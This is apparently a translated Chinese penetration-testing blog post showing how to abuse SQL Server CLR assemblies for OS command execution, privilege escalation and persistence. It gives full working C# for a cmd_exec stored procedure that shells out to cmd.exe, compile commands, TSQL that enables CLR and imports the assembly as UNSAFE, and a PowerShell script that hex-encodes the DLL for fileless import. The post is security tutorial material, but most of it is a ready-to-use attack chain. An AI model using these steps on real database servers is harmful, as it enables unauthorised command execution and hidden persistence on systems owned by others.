本文中，我将以Nathan
Krik的CLR系列文章提到的[CLR](https://en.wikipedia.org/wiki/SQL_CLR)[assembly](https://en.wikipedia.org/wiki/Assembly_\(CLI))为基础进行拓展。同时我也会介绍如何创建、导入、导出以及修改SQL
Server的CRL库去实现提权、命令执行以及持久化操作。
先让我们来对要介绍的内容进行一个略览。你也可以跳过这部分内容：
  * CLR assembly是什么？
  * 为SQL Server定制化CLR
  * 将CLR DLL文件转为16进制并导入（不需要通过文件）
  * 列出CLR的存储过程
  * 将存在的CLR assembly导出为dll
  * 修改导出的CLR DLL文件与在SQL Server中对存在的CLR Assembly进行修改
  * 通过定制化的CLR进行提权
## 什么是CLR assembly
为了能够达到本片博客的目的，我们将[Common Language Runtime](https://docs.microsoft.com/en-us/dotnet/standard/clr)(CLR) assembly定义为.Net DLL（也可理解为一组DLL文件），这些文件均能导入至SQL
Server。成功导入后，DLL的方法会被链接到存储过程，并通过TSQL执行。尽管创建和导入自定义CLR assembly是开发人员扩展SQL
Server的内置函数的好方法，但这也为攻击者制造了机会。
## 如何为SQL Server定制化CLR DLL
接下来的这段C#模版功能是执行操作系统命令，它是建立在Nathan
Kirik的工作成果和一些极棒的[微软文章](https://msdn.microsoft.com/en-us/library/ms131094.aspx)上。当然，你可以在此基础上进行修改，如果修改完了，记得另存为"C:\temp\cmd_exec.cs"。
    using System;
    using System.Data;
    using System.Data.SqlClient;
    using System.Data.SqlTypes;
    using Microsoft.SqlServer.Server;
    using System.IO;
    using System.Diagnostics;
    using System.Text;
    public partial class StoredProcedures
    {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void cmd_exec (SqlString execCommand)
        {
            Process proc = new Process();
            proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
            proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand.Value);
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            // Create the record and specify the metadata for the columns.
            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", SqlDbType.NVarChar, 4000));
            // Mark the beginning of the result set.
            SqlContext.Pipe.SendResultsStart(record);
            // Set values for each column in the row
            record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
            // Send the row back to the client.
            SqlContext.Pipe.SendResultsRow(record);
            // Mark the end of the result set.
            SqlContext.Pipe.SendResultsEnd();
            proc.WaitForExit();
            proc.Close();
        }
    };
现在咱们的目标是通过csc.exe对"C:\temp\cmd_exec.cs"进行编译。即使你没有安装Visual
Studio也不用担心，因为.NET框架默认是携带了csc.exe。所以，问题只是这个软件藏在你操作系统的某处。你可以通过下面这段PowerShell命令找到它哦。
    Get-ChildItem -Recurse "C:\Windows\Microsoft.NET\" -Filter "csc.exe" | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname
假设你已经找到了csc.exe，接着你可以通过下面这样的命令对 "c:\temp\cmd_exec.cs" 进行编译。
    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs
## 如何导入将CLR DLL导入到SQL Server
为了将刚生成的dll导入Sql Server，你必须以sysadmin权限登录，同时还需要CREATE ASSEMBLY的权限或者是ALTER
ASSEMBLY权限。按照下面的步骤来操作的话能够成功注入DLL并将其与存储过程链接在一起，这么一来的话就可以通过TSQL来执行cmd_exec函数了。
首先以sysadmin登录SQL Server接着进行下面的查询。
    -- Select the msdb database
    use msdb
    -- Enable show advanced options on the server
    sp_configure 'show advanced options',1
    RECONFIGURE
    GO
    -- Enable clr on the server
    sp_configure 'clr enabled',1
    RECONFIGURE
    GO
    -- Import the assembly
    CREATE ASSEMBLY my_assembly
    FROM 'c:\temp\cmd_exec.dll'
    WITH PERMISSION_SET = UNSAFE;
    -- Link the assembly to a stored procedure
    CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
    GO
现在你应该可以通过"msdb"中"cmd_exec"存储过程执行操作系统命令了，效果如下：
当你完成了这一步，你便可以通过下面的命令删除存储过程和assembly。
    DROP PROCEDURE cmd_exec
    DROP ASSEMBLY my_assembly
## 如何将CLR DLL转为十六进制字符串，而后不通过文件导出呢？
如果你阅读过Nathan Kirk's的[系列博客](http://sekirkity.com/requested-command-execution-with-sqli-via-seeclrly/)，那你一定知道在将CLR assemblies导入到SQL
Server时不必引用物理上的DLL。"CREATE ASSEMBLY"会接受十六进制形式的CLR
DLL文件。下面的PowerShell脚本例子会向你展示如何将'cmd_exec.dll'文件转化为TSQL命令，该命令不经过物理文件的引用就可用来创建assembly。
    # Target file
    $assemblyFile = "c:\temp\cmd_exec.dll"
    # Build top of TSQL CREATE ASSEMBLY statement
    $stringBuilder = New-Object -Type System.Text.StringBuilder 
    $stringBuilder.Append("CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x") | Out-Null
    # Read bytes from file
    $fileStream = [IO.File]::OpenRead($assemblyFile)
    while (($byte = $fileStream.ReadByte()) -gt -1) {
        $stringBuilder.Append($byte.ToString("X2")) | Out-Null
    }
    # Build bottom of TSQL CREATE ASSEMBLY statement
    $stringBuilder.AppendLine("`nWITH PERMISSION_SET = UNSAFE") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
    # Build create procedure command
    $stringBuilder.AppendLine("CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
    # Create run os command
    $stringBuilder.AppendLine("EXEC[dbo].[cmd_exec] 'whoami'") | Out-Null
    $stringBuilder.AppendLine("GO") | Out-Null
    $stringBuilder.AppendLine(" ") | Out-Null
    # Create file containing all commands
    $stringBuilder.ToString() -join "" | Out-File c:\temp\cmd_exec.txt
如果这一切都进行得很顺利，文件"c:\temp\cmd_exec.txt"会包含下面的TSQL命令。以文中的为例，你可以看到十六进制字符被截断了，但是你自己的那块应该更长点。
    -- Select the MSDB database
    USE msdb
    -- Enable clr on the server
    Sp_Configure 'clr enabled', 1
    RECONFIGURE
    GO
    -- Create assembly from ascii hex
    CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM 
    0x4D5A90000300000004000000F[TRUNCATED]
    WITH PERMISSION_SET = UNSAFE 
    GO 
    -- Create procedures from the assembly method cmd_exec
    CREATE PROCEDURE [dbo].[my_assembly] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [cmd_exec].[StoredProcedures].[cmd_exec]; 
    GO 
    -- Run an OS command as the SQL Server service account
    EXEC[dbo].[cmd_exec] 'whoami' 
    GO
当你在Sql Server中以sysadmin权限运行来自"c:\temp\cmd_exec.txt"的TSQL命令时，输出结果看起来应该和下面的差不多。
#### 利用PowerUpSQL自动化
如果你从未使用过PowerUpSQL，你可以在[这](https://github.com/NetSPI/PowerUpSQL/wiki)找到安装说明。
我写了个PowerUpSQL函数，名为Create-SQLFileCLRDLL，这可以用来加快创建类似的DLLs和TSQL脚本。该函数有一些可选参数，用来定制assembly名、类名、方法名以及存储过程名。如果不指定参数的话，这些名字都会随机的。下面是一个基本的命令例子：
    PS C:\temp> Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir c:\temp
    C# File: c:\temp\runcmd.csc
    CLR DLL: c:\temp\runcmd.dll
    SQL Cmd: c:\temp\runcmd.txt
下面的这行简短的代码时用来生成10个样本（CLR DLLS/CREATE ASSEMBLY TSQL脚本）。这对于在实验室尝试CLR
assemblies来说会非常方便。